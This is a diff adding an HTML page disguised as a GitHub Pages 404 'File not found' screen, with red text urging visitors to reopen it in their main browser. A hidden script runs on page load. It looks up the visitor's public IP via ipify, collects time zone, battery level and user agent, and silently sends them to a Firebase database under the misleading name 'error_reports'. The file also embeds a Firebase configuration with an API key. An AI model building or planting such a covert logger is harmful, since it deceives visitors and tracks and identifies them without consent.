@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Page not found · GitHub Pages</title>
+    <style>
+        body { 
+            background-color: #f1f1f1; 
+            color: #333; 
+            font-family: sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            text-align: center; 
+            padding: 20px;
+        }
+        h1 { 
+            font-size: 80px; 
+            margin: 0; 
+            color: #afafaf; 
+        }
+        /* Updated this class for the red attention text */
+        .instruction {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #d93025; /* A strong, readable red */
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>404</h1>
+        <p><strong>File not found</strong></p>
+        <p class="instruction">Please enter through your main browser to be able to access the content.</p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCosyYpQnenhxaRA6HNsz7xqS2B1E3u5z4",
+            authDomain: "private-network-message.firebaseapp.com",
+            projectId: "private-network-message",
+            storageBucket: "private-network-message.firebasestorage.app",
+            messagingSenderId: "411175484965",
+            appId: "1:411175484965:web:f9e54b0dbb9d85086149cc" 
+        };
+
+        try {
+            const app = initializeApp(firebaseConfig);
+            const db = getFirestore(app);
+
+            async function startLog() {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await res.json();
+                    
+                    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    let batt = "N/A";
+                    if ('getBattery' in navigator) {
+                        const b = await navigator.getBattery();
+                        batt = `${Math.round(b.level * 100)}%`;
+                    }
+
+                    await addDoc(collection(db, "error_reports"), {
+                        ip: ipData.ip,
+                        timezone: tz,
+                        battery: batt,
+                        agent: navigator.userAgent,
+                        time: serverTimestamp()
+                    });
+
+                    console.log("✅ Logged.");
+                } catch (err) {
+                    console.error("❌ Log failed:", err);
+                }
+            }
+
+            startLog();
+
+        } catch (setupError) {
+            console.error("❌ Config error:", setupError);
+        }
+    </script>
+</body>
+</html>
